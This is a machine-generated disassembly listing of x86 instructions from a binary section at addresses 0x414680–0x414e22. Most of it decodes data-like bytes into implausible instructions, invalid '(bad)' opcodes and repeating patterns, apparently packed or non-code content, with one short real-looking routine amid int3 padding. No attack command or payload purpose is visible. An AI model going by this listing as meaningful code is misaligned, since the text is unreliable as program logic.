  414680:	jmp    0xa11738ae
  414685:	dec    edi
  414686:	nop
  414687:	arpl   bp,di
  414689:	in     al,dx
  41468a:	and    eax,0x634b7092
  41468f:	pop    ebp
  414690:	jp     0x4146a1
  414692:	loop   0x4146a8
  414694:	test   al,0x6d
  414696:	nop
  414697:	sub    BYTE PTR [ecx+0x2a],al
  41469a:	dec    ecx
  41469b:	inc    esp
  41469c:	push   edx
  41469d:	fsubr  QWORD PTR [ebx+0x33b94331]
  4146a3:	xor    eax,0x50043cd
  4146a8:	inc    eax
  4146a9:	js     0x4146bb
  4146ab:	inc    ecx
  4146ac:	bound  eax,QWORD PTR [eax+0x40]
  4146af:	sldt   WORD PTR [eax-0x34]
  4146b3:	js     0x414717
  4146b5:	add    eax,0x40664143
  4146ba:	inc    ebx
  4146bb:	add    BYTE PTR [ecx+0x5],al
  4146be:	js     0x414700
  4146c0:	bound  eax,QWORD PTR [eax+0x0]
  4146c3:	inc    eax
  4146c4:	or     ah,BYTE PTR gs:[edx+0x30]
  4146c8:	push   ebx
  4146c9:	cmp    al,BYTE PTR [edi]
  4146cb:	xor    al,0x53
  4146cd:	inc    esp
  4146ce:	test   BYTE PTR [edx+edx*1],ch
  4146d1:	mov    ch,0xb5
  4146d3:	icebp  
  4146d4:	int3   
  4146d5:	leave  
  4146d6:	ret    
  4146d7:	inc    edi
  4146d8:	mov    ebx,0x33642bc6
  4146dd:	es and al,0x85
  4146e0:	aam    0xf4
  4146e2:	inc    ecx
  4146e3:	push   esi
  4146e4:	cwde   
  4146e5:	mov    ah,0x26
  4146e7:	inc    ebx
  4146e8:	mov    gs,WORD PTR [esi]
  4146ea:	push   eax
  4146eb:	sub    al,0xa8
  4146ed:	inc    esp
  4146ee:	push   edx
  4146ef:	nop
  4146f0:	test   BYTE PTR [ecx+0xc],0xe0
  4146f4:	adc    BYTE PTR [edx+0x46],al
  4146f7:	imul   edx,DWORD PTR [eax+0x12],0xc8bc5a53
  4146fe:	inc    ecx
  4146ff:	inc    ebx
  414700:	inc    eax
  414701:	inc    eax
  414702:	add    eax,0x434162
  414707:	inc    eax
  414708:	add    BYTE PTR [edx+0x5],ah
  41470b:	inc    eax
  41470c:	adc    BYTE PTR [edx+0x40],ah
  41470f:	inc    ebx
  414710:	inc    ecx
  414711:	add    eax,0x4340
  414716:	add    eax,0x404162
  41471b:	add    BYTE PTR [eax+0x43],al
  41471e:	inc    eax
  41471f:	add    eax,0x3992436c
  414724:	xchg   edi,eax
  414725:	mov    ebp,0xd1694442
  41472a:	mov    al,ds:0x2b094905
  41472f:	mov    ds:0x3194043e,eax
  414734:	push   ebx
  414735:	in     al,0xc0
  414737:	cmp    DWORD PTR [eax],esp
  414739:	cmp    eax,0x525e7101
  41473e:	addr16 dec eax
  414740:	inc    eax
  414741:	add    BYTE PTR [eax],al
  414743:	inc    ecx
  414744:	inc    ebx
  414745:	add    eax,0x41784062
  41474a:	inc    eax
  41474b:	inc    eax
  41474c:	add    BYTE PTR [edi],cl
  41474e:	bound  eax,QWORD PTR [ebx+0x0]
  414751:	add    eax,0x25006240
  414756:	inc    eax
  414757:	add    eax,0x40254143
  41475c:	add    eax,0x5c620000
  414761:	dec    eax
  414762:	in     eax,0x37
  414764:	jne    0x41473b
  414766:	les    ecx,FWORD PTR [esi-0x5458d474]
  41476c:	add    BYTE PTR [edi+0x4f],bh
  41476f:	test   al,0x1
  414771:	inc    ecx
  414772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414773:	or     edx,ecx
  414775:	xchg   ebp,eax
  414776:	inc    eax
  414777:	adc    BYTE PTR [edi+0x43],cl
  41477a:	xchg   edi,eax
  41477b:	adc    DWORD PTR [edi+0x55],edi
  41477e:	mov    esp,0x830b50a
  414783:	inc    esp
  414784:	jne    0x41478f
  414786:	inc    edx
  414787:	inc    esp
  414788:	dec    esp
  414789:	sub    BYTE PTR [ecx+edx*8+0x43],cl
  414790:	inc    ecx
  414791:	inc    eax
  414792:	bound  esp,QWORD PTR [esi+0x0]
  414795:	inc    eax
  414796:	add    eax,0x5400000
  41479b:	inc    ecx
  41479c:	inc    eax
  41479d:	inc    eax
  41479e:	bound  esp,QWORD PTR ds:0x25050043
  4147a4:	inc    ecx
  4147a5:	inc    ebx
  4147a6:	inc    eax
  4147a7:	test   BYTE PTR [eax+0x0],al
  4147aa:	bound  ebx,QWORD PTR [eax+0x62]
  4147ad:	inc    ecx
  4147ae:	inc    eax
  4147af:	inc    esi
  4147b0:	fdivr  DWORD PTR [ebx-0x9]
  4147b3:	mov    esp,0x3773be47
  4147b8:	push   edx
  4147b9:	fmul   DWORD PTR [edi+0x6d]
  4147bc:	test   edi,esi
  4147be:	push   edx
  4147bf:	dec    ebp
  4147c1:	arpl   WORD PTR [eax+0x4b],cx
  4147c4:	inc    ebx
  4147c5:	jmp    0x4147f4
  4147c7:	and    DWORD PTR [bx+di+0x15],esi
  4147cb:	inc    esp
  4147cc:	nop
  4147cd:	sbb    BYTE PTR [ebp+0x12],al
  4147d0:	icebp  
  4147d1:	les    edx,FWORD PTR [eax]
  4147d3:	bound  eax,QWORD PTR [eax+0x41]
  4147d6:	and    eax,0x40000500
  4147db:	inc    ebx
  4147dc:	add    eax,0x40624041
  4147e1:	inc    ebx
  4147e2:	add    eax,0x43402541
  4147e7:	bound  eax,QWORD PTR [eax+0x43]
  4147ea:	int3   
  4147eb:	inc    eax
  4147ec:	bound  eax,QWORD PTR [eax]
  4147ee:	inc    ecx
  4147ef:	inc    eax
  4147f0:	inc    eax
  4147f1:	add    eax,0x66f4705
  4147f6:	push   esi
  4147f7:	mov    al,0x26
  4147f9:	stc    
  4147fa:	dec    edi
  4147fb:	bound  esi,QWORD PTR [ebx+0x43]
  4147fe:	xchg   esp,eax
  4147ff:	cs pop esp
  414801:	or     DWORD PTR [eax+0x20],esi
  414804:	in     al,dx
  414805:	rol    DWORD PTR [esi+0x3d9f77f],1
  41480b:	bound  esp,QWORD PTR [esi-0x4b]
  41480e:	(bad)
  414811:	bound  eax,QWORD PTR [eax+0x25]
  414814:	add    BYTE PTR [esi+0x40],ah
  414817:	add    eax,0x40404143
  41481c:	inc    ebx
  41481d:	add    BYTE PTR [eax],al
  41481f:	add    BYTE PTR [edx-0x34],ah
  414822:	inc    eax
  414823:	add    eax,0x40004041
  414828:	inc    ecx
  414829:	int3   
  41482a:	add    BYTE PTR [ebx-0x7c],al
  41482d:	add    eax,0x5406240
  414832:	bound  edx,QWORD PTR [edx+0x62]
  414835:	pop    edi
  414836:	dec    edx
  414837:	icebp  
  414838:	mov    dl,0x46
  41483a:	fld    st(5)
  41483c:	sar    DWORD PTR ds:0x117ff0c9,cl
  414842:	push   ecx
  414843:	or     bl,BYTE PTR [eax]
  414845:	mov    eax,0x6240f14c
  41484a:	pop    eax
  41484b:	inc    ecx
  41484c:	add    eax,0x40404340
  414851:	inc    ebx
  414852:	inc    eax
  414853:	test   BYTE PTR [eax],al
  414855:	add    eax,0x40624041
  41485a:	inc    eax
  41485b:	add    BYTE PTR [edx+0x5],ah
  41485e:	inc    ebx
  41485f:	add    BYTE PTR [eax+0x78],al
  414862:	inc    ecx
  414863:	add    BYTE PTR [eax+0x41],bl
  414866:	(bad)  
  414867:	(bad)  
  414868:	stos   DWORD PTR es:[edi],eax
  414869:	mov    cl,0x7d
  41486b:	bound  ebx,QWORD PTR [esi+0x15]
  41486e:	inc    ecx
  41486f:	add    DWORD PTR [esi+0x42],eax
  414872:	gs cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  414875:	retf   
  414876:	inc    ebx
  414877:	mov    ebp,0x2009d1d5
  41487c:	push   ebx
  41487d:	inc    edx
  41487e:	xor    BYTE PTR [edx*8+0x6869d855],ah
  414885:	jne    0x4148ab
  414887:	pop    esi
  414888:	push   ecx
  414889:	inc    eax
  41488a:	test   BYTE PTR [eax],al
  41488c:	int3   
  41488d:	bound  eax,QWORD PTR ds:0xcc840f41
  414893:	inc    ebx
  414894:	add    BYTE PTR [eax+0x0],al
  414897:	inc    eax
  414898:	inc    eax
  414899:	inc    eax
  41489a:	int3   
  41489b:	add    BYTE PTR ds:0x62404341,al
  4148a1:	pop    eax
  4148a2:	add    BYTE PTR [ebx+0x40],al
  4148a5:	bound  ecx,QWORD PTR [edi]
  4148a7:	inc    eax
  4148a8:	adc    DWORD PTR [edx-0x5],edx
  4148ab:	mov    BYTE PTR [edi+eax*2],bh
  4148ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148af:	jbe    0x4148ea
  4148b1:	aad    0xa8
  4148b3:	sbb    al,BYTE PTR [edi-0x7b]
  4148b6:	mov    ebx,0x110a1315
  4148bb:	hlt    
  4148bc:	cmp    al,0x43
  4148be:	cwde   
  4148bf:	dec    ebx
  4148c0:	call   ecx
  4148c2:	dec    esp
  4148c3:	bound  edx,QWORD PTR [ecx-0x70]
  4148c6:	sub    DWORD PTR ds:0x6a426456,edi
  4148cc:	lds    esp,FWORD PTR [ebx]
  4148ce:	mov    al,ds:0x744df031
  4148d3:	mov    WORD PTR [ecx],gs
  4148d5:	inc    ebx
  4148d6:	mov    esi,DWORD PTR [ebp+0x27]
  4148d9:	sub    al,0x10
  4148db:	or     BYTE PTR [eax+eax*1+0x0],dl
  4148df:	inc    eax
  4148e0:	inc    eax
  4148e1:	cmovno eax,DWORD PTR ds:0x40056243
  4148e8:	int3   
  4148e9:	add    ah,cl
  4148eb:	inc    eax
  4148ec:	inc    eax
  4148ed:	bound  eax,QWORD PTR [ecx+0x0]
  4148f0:	add    BYTE PTR [edi],cl
  4148f2:	inc    ebx
  4148f3:	inc    eax
  4148f4:	inc    eax
  4148f5:	add    BYTE PTR [ecx+0x43],al
  4148f8:	add    eax,0x40256240
  4148fd:	bound  eax,QWORD PTR [eax]
  4148ff:	ror    DWORD PTR [esi],1
  414901:	or     cl,BYTE PTR [esi-0x2a]
  414904:	bound  esi,QWORD PTR [eax*2-0x4e8831bf]
  41490b:	int    0xea
  41490d:	dec    edi
  41490e:	in     eax,0x25
  414910:	sbb    BYTE PTR [eax],dh
  414912:	and    WORD PTR [eax*1+0x4140cc00],sp
  41491a:	inc    eax
  41491b:	inc    ebx
  41491c:	bound  esp,QWORD PTR ds:0x41400043
  414922:	add    BYTE PTR [eax],al
  414924:	add    eax,0x43624062
  414929:	inc    ecx
  41492a:	inc    eax
  41492b:	inc    eax
  41492c:	inc    eax
  41492d:	add    eax,0x40624340
  414932:	add    eax,0x40664140
  414937:	mul    BYTE PTR [edi+0x45]
  41493a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41493b:	cdq    
  41493c:	adc    esp,esi
  41493e:	jmp    0x9e238ae
  414943:	add    eax,0x84dcf96b
  414948:	and    eax,DWORD PTR [ecx-0x53]
  41494b:	jno    0x4149c6
  41494d:	or     ebx,edx
  41494f:	push   ebx
  414950:	test   al,0x43
  414952:	push   ds
  414953:	mov    edi,0xdd5cd978
  414958:	js     0x41498a
  41495a:	inc    ebx
  41495b:	add    BYTE PTR ds:0x41107840,al
  414961:	bound  eax,QWORD PTR [eax+0x40]
  414964:	sldt   WORD PTR [eax-0x34]
  414968:	js     0x4149cc
  41496a:	add    eax,0x40664143
  41496f:	inc    ebx
  414970:	add    BYTE PTR [ecx+0x5],al
  414973:	js     0x4149b5
  414975:	bound  eax,QWORD PTR [eax+0x0]
  414978:	inc    eax
  414979:	retf   0x536c
  41497c:	push   edx
  41497d:	arpl   WORD PTR ds:0xf7d02013,bx
  414983:	fcmovnb st,st(5)
  414985:	bound  esi,QWORD PTR [esp+eiz*2]
  414988:	inc    edi
  414989:	xor    al,0x4a
  41498b:	sar    BYTE PTR [edi+0x20],cl
  41498e:	mov    ebp,DWORD PTR [ebp-0x7b]
  414991:	pop    ss
  414992:	push   ebx
  414993:	pop    es
  414994:	ins    DWORD PTR es:[edi],dx
  414995:	(bad)  
  414996:	into   
  414997:	in     al,0x43
  414999:	fwait
  41499a:	xor    dh,bh
  41499c:	push   ebp
  41499d:	in     al,dx
  41499e:	fidiv  DWORD PTR [edx-0x70]
  4149a1:	push   0xffffff99
  4149a3:	pop    ebp
  4149a4:	or     DWORD PTR [ebx-0x70],esp
  4149a7:	dec    ebx
  4149a8:	shr    BYTE PTR [edx+0x4341f17e],0x40
  4149af:	inc    eax
  4149b0:	add    eax,0x434162
  4149b5:	inc    eax
  4149b6:	add    BYTE PTR [edx+0x5],ah
  4149b9:	inc    eax
  4149ba:	adc    BYTE PTR [edx+0x40],ah
  4149bd:	inc    ebx
  4149be:	inc    ecx
  4149bf:	add    eax,0x4340
  4149c4:	add    eax,0x404162
  4149c9:	add    BYTE PTR [eax+0x43],al
  4149cc:	inc    eax
  4149cd:	add    eax,0x495205d8
  4149d2:	inc    ebx
  4149d3:	jae    0x414992
  4149d5:	push   ss
  4149d6:	push   edx
  4149d7:	xchg   DWORD PTR [esi],ebx
  4149d9:	ror    DWORD PTR ds:0x337e,1
  4149de:	aad    0xa1
  4149e0:	sub    al,0x78
  4149e2:	jbe    0x4149ad
  4149e4:	mov    edi,0xb9822862
  4149e9:	cmp    al,0xdb
  4149eb:	inc    eax
  4149ec:	rcl    DWORD PTR [ebx+0x63534cf5],0x50
  4149f3:	inc    eax
  4149f4:	jmp    DWORD PTR [ecx]
  4149f6:	cli    
  4149f7:	nop
  4149f8:	fld    QWORD PTR [eax+0x334040e5]
  4149fe:	or     DWORD PTR [eax+0x35],ebp
  414a01:	test   al,0x40
  414a03:	add    BYTE PTR [eax],al
  414a05:	inc    ecx
  414a06:	inc    ebx
  414a07:	add    eax,0x41784062
  414a0c:	inc    eax
  414a0d:	inc    eax
  414a0e:	add    BYTE PTR [edi],cl
  414a10:	bound  eax,QWORD PTR [ebx+0x0]
  414a13:	add    eax,0x25006240
  414a18:	inc    eax
  414a19:	add    eax,0x40254143
  414a1e:	add    eax,0x41620000
  414a23:	add    al,0x52
  414a25:	into   
  414a26:	fnstenv [esi]
  414a28:	inc    edx
  414a29:	add    al,BYTE PTR [ebx+0x40]
  414a2c:	push   ebp
  414a2d:	repz push edx
  414a2f:	test   eax,0x4030de3d
  414a34:	pop    ds
  414a35:	dec    ebp
  414a36:	int    0xb0
  414a38:	jnp    0x414a9c
  414a3a:	sbb    al,0x40
  414a3c:	mov    edi,0x422f62b1
  414a41:	pop    es
  414a42:	inc    edi
  414a43:	or     al,0x49
  414a45:	dec    ebp
  414a46:	fst    st(3)
  414a48:	enter  0x8534,0x40
  414a4c:	popa   
  414a4d:	mov    edi,0x716d5864
  414a52:	inc    ebx
  414a53:	adc    dl,BYTE PTR [ebx]
  414a55:	dec    edx
  414a56:	inc    ebx
  414a57:	add    BYTE PTR [eax],al
  414a59:	add    BYTE PTR [ecx+0x40],al
  414a5c:	bound  esp,QWORD PTR [esi+0x0]
  414a5f:	inc    eax
  414a60:	add    eax,0x5400000
  414a65:	inc    ecx
  414a66:	inc    eax
  414a67:	inc    eax
  414a68:	bound  esp,QWORD PTR ds:0x25050043
  414a6e:	inc    ecx
  414a6f:	inc    ebx
  414a70:	inc    eax
  414a71:	test   BYTE PTR [eax+0x0],al
  414a74:	bound  ebx,QWORD PTR [eax+0x62]
  414a77:	inc    ecx
  414a78:	inc    eax
  414a79:	stc    
  414a7a:	(bad)  
  414a7b:	ss pop edx
  414a7d:	nop
  414a7e:	inc    eax
  414a7f:	inc    ecx
  414a80:	xchg   ebp,eax
  414a81:	or     DWORD PTR ds:0x15dd628c,eax
  414a87:	adc    DWORD PTR [edi+0x436263d9],edi
  414a8d:	inc    ebx
  414a8e:	inc    eax
  414a8f:	enter  0x526e,0x54
  414a93:	sub    ecx,DWORD PTR [eax-0x2f]
  414a96:	outs   dx,BYTE PTR ds:[esi]
  414a97:	xchg   ebx,eax
  414a98:	fwait
  414a99:	(bad)
  414a9c:	or     eax,0x423c4082
  414aa1:	sbb    al,0xcd
  414aa3:	arpl   WORD PTR [ebp+0xf],bp
  414aa6:	push   cs
  414aa7:	push   ecx
  414aa8:	rol    DWORD PTR [ebp-0x1ac038b0],cl
  414aae:	inc    eax
  414aaf:	jg     0x414ac1
  414ab1:	bound  eax,QWORD PTR [eax+0x41]
  414ab4:	and    eax,0x40000500
  414ab9:	inc    ebx
  414aba:	add    eax,0x40624041
  414abf:	inc    ebx
  414ac0:	add    eax,0x43402541
  414ac5:	bound  eax,QWORD PTR [eax+0x43]
  414ac8:	int3   
  414ac9:	inc    eax
  414aca:	bound  eax,QWORD PTR [eax]
  414acc:	inc    ecx
  414acd:	inc    eax
  414ace:	inc    eax
  414acf:	add    eax,0x3d654305
  414ad4:	rcl    BYTE PTR [edi],0xb4
  414ad7:	(bad)  
  414ad9:	jno    0x414ae4
  414adb:	ret    
  414adc:	push   0x424041ab
  414ae1:	inc    eax
  414ae2:	fcom   DWORD PTR [edx-0x6d]
  414ae5:	mov    eax,0x12d10943
  414aea:	push   edx
  414aeb:	xor    al,0xab
  414aed:	jmp    0x42d5:0x96a4030
  414af4:	inc    ecx
  414af5:	daa    
  414af6:	sbb    BYTE PTR [esp+esi*2],dl
  414af9:	inc    esp
  414afa:	arpl   WORD PTR [eax],si
  414afc:	enter  0x4740,0x40
  414b00:	aas    
  414b01:	rcl    BYTE PTR [ebp+0x54],1
  414b04:	mov    esp,0x29038550
  414b09:	pcmpgtb mm4,QWORD PTR [edx+0x42]
  414b0d:	daa    
  414b0e:	bound  eax,QWORD PTR [eax+0x25]
  414b11:	add    BYTE PTR [esi+0x40],ah
  414b14:	add    eax,0x40404143
  414b19:	inc    ebx
  414b1a:	add    BYTE PTR [eax],al
  414b1c:	add    BYTE PTR [edx-0x34],ah
  414b1f:	inc    eax
  414b20:	add    eax,0x40004041
  414b25:	inc    ecx
  414b26:	int3   
  414b27:	add    BYTE PTR [ebx-0x7c],al
  414b2a:	add    eax,0x5406240
  414b2f:	bound  eax,QWORD PTR [ebx+0x40]
  414b32:	jbe    0x414b76
  414b34:	cli    
  414b35:	pop    eax
  414b36:	test   al,0xa6
  414b38:	nop
  414b39:	adc    eax,0x4509d0d2
  414b3e:	fs arpl dx,di
  414b41:	inc    eax
  414b42:	xor    eax,0x62f9d9b5
  414b47:	push   esp
  414b48:	inc    ebx
  414b49:	adc    al,BYTE PTR [ebx+0x42]
  414b4c:	push   edx
  414b4d:	inc    eax
  414b4e:	bound  ebx,QWORD PTR [eax+0x41]
  414b51:	add    eax,0x40404340
  414b56:	inc    ebx
  414b57:	inc    eax
  414b58:	test   BYTE PTR [eax],al
  414b5a:	add    eax,0x40624041
  414b5f:	inc    eax
  414b60:	add    BYTE PTR [edx+0x5],ah
  414b63:	inc    ebx
  414b64:	add    BYTE PTR [eax+0x78],al
  414b67:	inc    ecx
  414b68:	add    BYTE PTR [eax+0x41],bl
  414b6b:	bound  ebp,QWORD PTR [edx+0x0]
  414b6e:	sub    eax,0xdf7240d1
  414b73:	int    0x64
  414b75:	test   al,0x39
  414b77:	outs   dx,BYTE PTR ds:[esi]
  414b78:	adc    al,0x6d
  414b7a:	jae    0x414b44
  414b7c:	ins    DWORD PTR es:[edi],dx
  414b7d:	push   ebp
  414b7e:	push   0x42244082
  414b83:	xor    ebp,ebx
  414b85:	jg     0x414bbf
  414b87:	pop    ebp
  414b88:	adc    ebx,DWORD PTR [edi]
  414b8a:	shl    DWORD PTR [ebp+0x50],cl
  414b8d:	test   al,0x7c
  414b8f:	sub    al,0x40
  414b91:	inc    eax
  414b92:	jbe    0x414b9d
  414b94:	shl    BYTE PTR [edi+0x6a],1
  414b97:	inc    ecx
  414b98:	push   cs
  414b99:	rcl    DWORD PTR [eax],1
  414b9b:	fsubr  DWORD PTR [ebx-0x6e]
  414b9e:	lods   al,BYTE PTR ds:[esi]
  414b9f:	inc    eax
  414ba0:	test   BYTE PTR [eax],al
  414ba2:	int3   
  414ba3:	bound  eax,QWORD PTR ds:0xcc840f41
  414ba9:	inc    ebx
  414baa:	add    BYTE PTR [eax+0x0],al
  414bad:	inc    eax
  414bae:	inc    eax
  414baf:	inc    eax
  414bb0:	int3   
  414bb1:	add    BYTE PTR ds:0x62404341,al
  414bb7:	pop    eax
  414bb8:	add    BYTE PTR [ebx+0x40],al
  414bbb:	bound  ecx,QWORD PTR [edi]
  414bbd:	inc    eax
  414bbe:	inc    ebx
  414bbf:	inc    eax
  414bc0:	and    al,0x5
  414bc2:	push   edx
  414bc3:	push   ds
  414bc4:	push   edx
  414bc5:	ret    
  414bc6:	xor    BYTE PTR [ecx],cl
  414bc8:	jae    0x414c16
  414bca:	lds    esi,FWORD PTR [eax+0x401479bc]
  414bd0:	pop    ss
  414bd1:	nop
  414bd2:	bound  eax,QWORD PTR ds:0x1f473e95
  414bd8:	pop    ebp
  414bd9:	jb     0x414b98
  414bdb:	retf   
  414bdc:	icebp  
  414bdd:	inc    eax
  414bde:	test   DWORD PTR [eax],eax
  414be0:	add    BYTE PTR [eax+0x40],al
  414be3:	cmovno eax,DWORD PTR ds:0x40056243
  414bea:	int3   
  414beb:	add    ah,cl
  414bed:	inc    eax
  414bee:	inc    eax
  414bef:	bound  eax,QWORD PTR [ecx+0x0]
  414bf2:	add    BYTE PTR [edi],cl
  414bf4:	inc    ebx
  414bf5:	inc    eax
  414bf6:	inc    eax
  414bf7:	add    BYTE PTR [ecx+0x43],al
  414bfa:	add    eax,0x40256240
  414bff:	bound  eax,QWORD PTR [eax]
  414c01:	inc    eax
  414c02:	mov    cl,0x40
  414c04:	fs inc ecx
  414c06:	arpl   WORD PTR [eax-0x4fbdebbd],di
  414c0c:	inc    esp
  414c0d:	dec    ebp
  414c0e:	pop    esp
  414c0f:	jno    0x414ba1
  414c11:	inc    eax
  414c12:	adc    ebp,esi
  414c14:	sub    al,0xcc
  414c16:	cmp    eax,0x431097e1
  414c1b:	shufps xmm6,XMMWORD PTR [edi],0xb8
  414c1f:	leave  
  414c20:	test   al,0x40
  414c22:	mov    bl,0x40
  414c24:	aad    0x54
  414c26:	add    eax,0x5f1940cd
  414c2b:	adc    al,0x5
  414c2d:	add    ah,cl
  414c2f:	inc    eax
  414c30:	inc    ecx
  414c31:	inc    eax
  414c32:	inc    ebx
  414c33:	bound  esp,QWORD PTR ds:0x41400043
  414c39:	add    BYTE PTR [eax],al
  414c3b:	add    eax,0x43624062
  414c40:	inc    ecx
  414c41:	inc    eax
  414c42:	inc    eax
  414c43:	inc    eax
  414c44:	add    eax,0x40624340
  414c49:	add    eax,0x40664140
  414c4e:	addr16 push 0x7b
  414c51:	jne    0x414c7d
  414c53:	inc    eax
  414c54:	xor    DWORD PTR [edx+0x6a],eax
  414c57:	(bad)  
  414c58:	inc    edx
  414c59:	dec    esp
  414c5a:	inc    esi
  414c5b:	adc    ch,BYTE PTR [edi+0x70]
  414c5e:	push   esp
  414c5f:	fs mov edi,0x96402a62
  414c65:	int3   
  414c66:	int3   
  414c67:	int3   
  414c68:	int3   
  414c69:	int3   
  414c6a:	int3   
  414c6b:	int3   
  414c6c:	int3   
  414c6d:	int3   
  414c6e:	int3   
  414c6f:	int3   
  414c70:	dec    edx
  414c71:	and    eax,edx
  414c73:	nop
  414c74:	not    edx
  414c76:	inc    edx
  414c77:	add    eax,edx
  414c79:	ret    
  414c7a:	int3   
  414c7b:	int3   
  414c7c:	int3   
  414c7d:	int3   
  414c7e:	int3   
  414c7f:	int3   
  414c80:	inc    edx
  414c81:	inc    esp
  414c82:	xor    al,0xf4
  414c84:	inc    ebx
  414c85:	add    BYTE PTR ds:0x41107840,al
  414c8b:	bound  eax,QWORD PTR [eax+0x40]
  414c8e:	sldt   WORD PTR [eax-0x34]
  414c92:	js     0x414cf6
  414c94:	add    eax,0x40664143
  414c99:	inc    ebx
  414c9a:	add    BYTE PTR [ecx+0x5],al
  414c9d:	js     0x414cdf
  414c9f:	bound  eax,QWORD PTR [eax+0x0]
  414ca2:	inc    eax
  414ca3:	rcr    DWORD PTR [edx+0x2c7f3503],1
  414ca9:	inc    eax
  414caa:	inc    ecx
  414cab:	rcl    BYTE PTR [esi+0x40],1
  414cae:	inc    ebx
  414caf:	jb     0x414c75
  414cb1:	lods   al,BYTE PTR ds:[esi]
  414cb2:	push   es
  414cb3:	(bad)  
  414cb4:	call   0x4883fdbe
  414cb9:	cmp    eax,0x407d4719
  414cbe:	sub    eax,0x62c39d71
  414cc3:	pushf  
  414cc4:	inc    edi
  414cc5:	add    al,0xd3
  414cc7:	inc    ecx
  414cc8:	inc    esp
  414cc9:	inc    edx
  414cca:	jnp    0x414d2a
  414ccc:	inc    ebx
  414ccd:	inc    eax
  414cce:	mov    ebx,0x40404341
  414cd3:	add    eax,0x434162
  414cd8:	inc    eax
  414cd9:	add    BYTE PTR [edx+0x5],ah
  414cdc:	inc    eax
  414cdd:	adc    BYTE PTR [edx+0x40],ah
  414ce0:	inc    ebx
  414ce1:	inc    ecx
  414ce2:	add    eax,0x4340
  414ce7:	add    eax,0x404162
  414cec:	add    BYTE PTR [eax+0x43],al
  414cef:	inc    eax
  414cf0:	add    eax,0x98412cd0
  414cf5:	inc    edi
  414cf6:	xor    BYTE PTR [eax+0x44],al
  414cf9:	pop    ebx
  414cfa:	ret    0x69ec
  414cfd:	fucom  st(4)
  414cff:	inc    eax
  414d00:	xchg   ecx,eax
  414d01:	push   cs
  414d02:	imul   eax,DWORD PTR [esi+0x34],0x5d404764
  414d09:	inc    eax
  414d0a:	add    BYTE PTR [eax],al
  414d0c:	inc    ecx
  414d0d:	inc    ebx
  414d0e:	add    eax,0x41784062
  414d13:	inc    eax
  414d14:	inc    eax
  414d15:	add    BYTE PTR [edi],cl
  414d17:	bound  eax,QWORD PTR [ebx+0x0]
  414d1a:	add    eax,0x25006240
  414d1f:	inc    eax
  414d20:	add    eax,0x40254143
  414d25:	add    eax,0x40620000
  414d2a:	xchg   ebp,eax
  414d2b:	test   al,0x29
  414d2d:	inc    eax
  414d2e:	test   DWORD PTR [eax+0x33],eax
  414d31:	or     DWORD PTR [ebp+0x10],ecx
  414d34:	xchg   ebp,eax
  414d35:	mov    ebp,0x46280c60
  414d3a:	sub    al,0xc7
  414d3c:	adc    DWORD PTR [edx-0x10],ebp
  414d3f:	inc    eax
  414d40:	push   ecx
  414d41:	rol    al,1
  414d43:	sti    
  414d44:	inc    ebx
  414d45:	add    BYTE PTR [eax],al
  414d47:	add    BYTE PTR [ecx+0x40],al
  414d4a:	bound  esp,QWORD PTR [esi+0x0]
  414d4d:	inc    eax
  414d4e:	add    eax,0x5400000
  414d53:	inc    ecx
  414d54:	inc    eax
  414d55:	inc    eax
  414d56:	bound  esp,QWORD PTR ds:0x25050043
  414d5c:	inc    ecx
  414d5d:	inc    ebx
  414d5e:	inc    eax
  414d5f:	test   BYTE PTR [eax+0x0],al
  414d62:	bound  ebx,QWORD PTR [eax+0x62]
  414d65:	inc    ecx
  414d66:	inc    eax
  414d67:	les    ecx,FWORD PTR [ebx+0xdc90da5]
  414d6d:	sbb    DWORD PTR [edx-0x5],esp
  414d70:	cmp    al,0xb4
  414d72:	inc    eax
  414d73:	xor    DWORD PTR [eax-0x6b],eax
  414d76:	outs   dx,BYTE PTR ds:[esi]
  414d77:	inc    esp
  414d78:	push   ebp
  414d79:	inc    ebx
  414d7a:	adc    al,0x41
  414d7c:	pop    ds
  414d7d:	inc    esp
  414d7e:	int3   
  414d7f:	test   al,0x90
  414d81:	rol    BYTE PTR [eax-0xf],cl
  414d84:	adc    BYTE PTR [edx+0x40],ah
  414d87:	inc    ecx
  414d88:	and    eax,0x40000500
  414d8d:	inc    ebx
  414d8e:	add    eax,0x40624041
  414d93:	inc    ebx
  414d94:	add    eax,0x43402541
  414d99:	bound  eax,QWORD PTR [eax+0x43]
  414d9c:	int3   
  414d9d:	inc    eax
  414d9e:	bound  eax,QWORD PTR [eax]
  414da0:	inc    ecx
  414da1:	inc    eax
  414da2:	inc    eax
  414da3:	add    eax,0x522c4005
  414da8:	push   edi
  414da9:	push   0xd07b08dc
  414dae:	ds jne 0x414e1c
  414db1:	icebp  
  414db2:	je     0x414df4
  414db4:	adc    al,0x51
  414db6:	int    0xcd
  414db8:	push   edx
  414db9:	cmp    BYTE PTR [ebx+0x6e],bh
  414dbc:	xor    al,BYTE PTR [ebx]
  414dbe:	xor    BYTE PTR [edx+0x1a],ch
  414dc1:	jne    0x414d9d
  414dc3:	inc    eax
  414dc4:	arpl   WORD PTR [eax+0x62],sp
  414dc7:	inc    eax
  414dc8:	and    eax,0x5406600
  414dcd:	inc    ebx
  414dce:	inc    ecx
  414dcf:	inc    eax
  414dd0:	inc    eax
  414dd1:	inc    ebx
  414dd2:	add    BYTE PTR [eax],al
  414dd4:	add    BYTE PTR [edx-0x34],ah
  414dd7:	inc    eax
  414dd8:	add    eax,0x40004041
  414ddd:	inc    ecx
  414dde:	int3   
  414ddf:	add    BYTE PTR [ebx-0x7c],al
  414de2:	add    eax,0x5406240
  414de7:	bound  esp,QWORD PTR [esi+0x41d03464]
  414ded:	push   cs
  414dee:	rcl    eax,1
  414df0:	arpl   WORD PTR fs:[esi],dx
  414df3:	mov    al,ds:0x16bd4043
  414df8:	fs add eax,0xf30f142
  414dfe:	pop    esp
  414dff:	cs enter 0x5687,0xd9
  414e04:	loopne 0x414e46
  414e06:	pop    ecx
  414e07:	push   eax
  414e08:	inc    eax
  414e09:	bound  ebx,QWORD PTR [eax+0x41]
  414e0c:	add    eax,0x40404340
  414e11:	inc    ebx
  414e12:	inc    eax
  414e13:	test   BYTE PTR [eax],al
  414e15:	add    eax,0x40624041
  414e1a:	inc    eax
  414e1b:	add    BYTE PTR [edx+0x5],ah
  414e1e:	inc    ebx
  414e1f:	add    BYTE PTR [eax+0x78],al
  414e22:	inc    ecx
